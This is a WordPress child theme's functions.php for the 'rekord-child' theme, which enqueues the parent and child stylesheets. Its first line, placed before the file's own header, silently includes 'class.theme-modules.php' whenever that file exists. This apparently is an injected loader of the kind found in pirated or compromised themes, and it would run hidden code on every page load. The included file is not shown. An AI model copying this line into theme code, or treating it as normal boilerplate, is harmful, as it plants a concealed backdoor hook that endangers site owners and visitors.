<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
/**
 *  Rekord functions and definitions
 *
 *  @author    xvelopers
 *  @package   rekord-child
 *  @version   1.0.0
 *  @since     1.0.0
 */


add_action( 'wp_enqueue_scripts', 'rekord_child_enqueue_styles' );
function rekord_child_enqueue_styles() {
    wp_enqueue_style( 'parent-style', get_template_directory_uri() . '/style.css' );
    wp_enqueue_style( 'child-style',
        get_stylesheet_directory_uri() . '/style.css',
        array('parent-style')
    );
}